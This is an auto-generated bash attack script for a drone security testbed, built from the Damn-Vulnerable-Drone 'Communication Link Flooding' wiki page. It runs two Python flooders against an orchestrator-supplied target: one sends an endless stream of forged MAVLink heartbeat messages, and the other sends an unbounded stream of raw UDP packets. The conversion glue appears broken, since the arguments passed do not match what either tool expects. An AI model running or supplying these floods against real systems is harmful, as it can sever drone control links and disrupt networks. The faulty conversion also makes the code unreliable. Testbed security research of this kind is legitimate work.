#!/usr/bin/env bash
# Auto-generated from: /home/kali/MTD_full_testbed/Damn-Vulnerable-Drone.wiki/Communication-Link-Flooding.md
# Created: 2025-09-14 13:46:03
# NOTE: 설명/서사는 제거되었고, 코드블록/프롬프트 명령만 포함됩니다.

# MTD_INTERFACE_START
# =======================================================================
# MTD-aware Target Acquisition (from Orchestrator Environment)
# =======================================================================
# 이 스크립트는 attack_orchestrator.py에 의해 TARGET_IP와 TARGET_PORT 환경 변수가
# 설정될 것을 기대하고 실행됩니다.

if [[ -z "${TARGET_IP:-}" || -z "${TARGET_PORT:-}" ]]; then
    echo "ERROR: TARGET_IP and TARGET_PORT environment variables are not set." >&2
    echo "This script must be run via the attack_orchestrator.py" >&2
    exit 1
fi

echo "[INFO] Attack target acquired from orchestrator: ${TARGET_IP}:${TARGET_PORT}"
# MTD_INTERFACE_END

set -euo pipefail

# 기준 경로 (요구사항)
export BASE="${BASE:-$PWD}"

# 공통 로그 연결(선택사항) - 존재 시 로드
if [[ -f "$BASE/00_env.sh" ]]; then . "$BASE/00_env.sh"; else
  DVD_LOG="${DVD_LOG:-$BASE/attack_output/dvd.log}"; mkdir -p "$(dirname "$DVD_LOG")"
  log(){ echo "[`date +%F_%T`] $*"; }; export -f log
fi

log "[ATTACK] id=communication-link-flooding src=Communication-Link-Flooding.md"
log "[BLOCK 1] type=python"
python3 - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
# flood_mavlink_link.py

from pymavlink import mavutil
import time
import sys

def flood_mavlink(target_ip, target_port, rate_hz):
    mav = mavutil.mavlink.MAVLink(None)
    mav.srcSystem = 1
    mav.srcComponent = 1

    sock = mavutil.mavlink_connection(f'tcp:{target_ip}:{target_port}')
    sock.wait_heartbeat()
    print(f"Connected. Starting flood at {rate_hz} messages/sec...")

    interval = 1 / rate_hz
    while True:
        msg = mav.heartbeat_encode(
            type=mavutil.mavlink.MAV_TYPE_GENERIC,
            autopilot=mavutil.mavlink.MAV_AUTOPILOT_INVALID,
            base_mode=0,
            custom_mode=0,
            system_status=mavutil.mavlink.MAV_STATE_ACTIVE
        )
        sock.mav.send(msg)
        print("[+] Flooding heartbeat")
        time.sleep(interval)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python flood_mavlink_link.py <ip:port> <rate_hz>")
        sys.exit(1)

    ip, port = sys.argv[1].split(":")
    flood_mavlink(ip, int(port), float(sys.argv[2]))
PY

log "[BLOCK 2] type=python"
python3 - "${TARGET_IP}:${TARGET_PORT}" <<'PY'
# --- argv glue for converter ---
import os, sys, re
if len(sys.argv) <= 1:
    ep = os.environ.get('TARGET_EP') or os.environ.get('MAV_EP', 'udp:${TARGET_IP}:14550')
    if ep.startswith('udp:'):
        try:
            _, rest = ep.split(':', 1)
            ep = rest
        except ValueError:
            pass
    # expect ip:port
    if re.match(r'^\d{1,3}(\.\d{1,3}){3}:\d+$', ep):
        sys.argv = [sys.argv[0], ep]
# udp_raw_flood.py

import socket
import time
import sys

def flood_udp(ip, port, size=1024, interval=0.001):
    sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
    payload = b"A" * size

    print(f"Flooding {ip}:{port} with {size}-byte packets every {interval}s...")
    while True:
        sock.sendto(payload, (ip, port))
        time.sleep(interval)

if __name__ == "__main__":
    if len(sys.argv) != 3:
        print("Usage: python udp_raw_flood.py <ip> <port>")
        sys.exit(1)

    flood_udp(sys.argv[1], int(sys.argv[2]))
PY

